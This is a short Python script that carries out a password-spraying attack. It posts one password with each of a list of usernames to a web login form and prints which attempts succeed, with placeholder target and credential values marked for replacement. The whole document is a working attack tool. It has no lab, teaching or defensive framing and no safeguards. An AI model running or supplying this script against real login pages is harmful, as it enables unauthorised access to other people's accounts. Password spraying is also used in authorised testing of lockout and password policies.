import requests

def password_spray(target_url, usernames, password):
    for username in usernames:
        # Prepare the login data payload (change 'username' and 'password' to match form fields)
        login_data = {
            'username': username,
            'password': password
        }

        # Send POST request to the login URL
        response = requests.post(target_url, data=login_data)

        # Check the response to determine success (change condition as per the application response)
        if "login failed" not in response.text.lower():
            print(f"[+] Success: Username: {username}, Password: {password}")
        else:
            print(f"[-] Failed: Username: {username}, Password: {password}")

# Define the target URL and credentials to test
target_url = 'http://example.com/login'  # Replace with target login URL
usernames = ['user1', 'user2', 'user3']  # Replace with the list of usernames
password = 'Password123'  # The password to test

password_spray(target_url, usernames, password)
